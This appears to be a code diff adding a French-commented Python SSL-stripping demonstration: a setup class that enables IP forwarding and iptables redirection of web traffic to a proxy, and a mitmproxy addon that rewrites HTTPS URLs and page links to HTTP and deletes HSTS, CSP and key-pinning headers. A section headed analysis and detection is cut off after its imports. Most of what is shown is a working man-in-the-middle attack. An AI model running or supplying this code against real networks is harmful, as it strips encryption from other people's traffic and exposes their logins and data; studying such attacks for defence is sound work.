@@ -1,3 +1,80 @@
+##Partie 1##
+from mitmproxy import ctx
+from mitmproxy import http
+import os
+import logging
+
+class SSLStripDemo:
+
+    def __init__(self):
+        self.setup_logging()
+
+    def setup_logging(self):
+        """Configure le système de logs"""
+        logging.basicConfig(
+            filename='ssl_strip.log',
+            level=logging.INFO,
+            format='%(asctime)s - %(levelname)s - %(message)s'
+        )
+
+    def setup_test_environment(self):
+        """Prépare l'environnement de test"""
+        # Configuration du réseau virtuel
+        os.system('ip addr add 192.168.1.1/24 dev eth0')
+        os.system('echo 1 > /proc/sys/net/ipv4/ip_forward')
+
+        # Configuration des règles iptables
+        os.system('iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-port 8080')
+        os.system('iptables -t nat -A PREROUTING -p tcp --dport 443 -j REDIRECT --to-port 8080')
+
+    def cleanup(self):
+        """Nettoie l'environnement après les tests"""
+        os.system('iptables -t nat -F')
+        os.system('echo 0 > /proc/sys/net/ipv4/ip_forward')
+
+##Partie 2##
+
+from mitmproxy import ctx
+from mitmproxy import http
+import re
+
+class SSLStripper:
+    def __init__(self):
+        self.stripped_urls = set()
+
+    def request(self, flow: http.HTTPFlow) -> None:
+        """Intercepte et modifie les requêtes"""
+        # Conversion des URLs HTTPS en HTTP
+        if flow.request.pretty_url.startswith('https://'):
+            stripped_url = flow.request.pretty_url.replace('https://', 'http://')
+            self.stripped_urls.add(stripped_url)
+            flow.request.url = stripped_url
+
+        # Modification des en-têtes
+        if 'Upgrade-Insecure-Requests' in flow.request.headers:
+            del flow.request.headers['Upgrade-Insecure-Requests']
+
+    def response(self, flow: http.HTTPFlow) -> None:
+        """Intercepte et modifie les réponses"""
+        # Remplacement des liens HTTPS par HTTP
+        if flow.response.headers.get('content-type', '').startswith('text/html'):
+            content = flow.response.content.decode('utf-8', 'ignore')
+            content = re.sub(r'https://', 'http://', content)
+            flow.response.content = content.encode('utf-8')
+
+        # Suppression des en-têtes de sécurité
+        headers_to_remove = [
+            'Strict-Transport-Security',
+            'Content-Security-Policy',
+            'Public-Key-Pins'
+        ]
+        for header in headers_to_remove:
+            if header in flow.response.headers:
+                del flow.response.headers[header]
+
+addons = [SSLStripper()]
+
+##Partie 3 Analyse et Détection##
 from scapy.all import *
 import logging
 
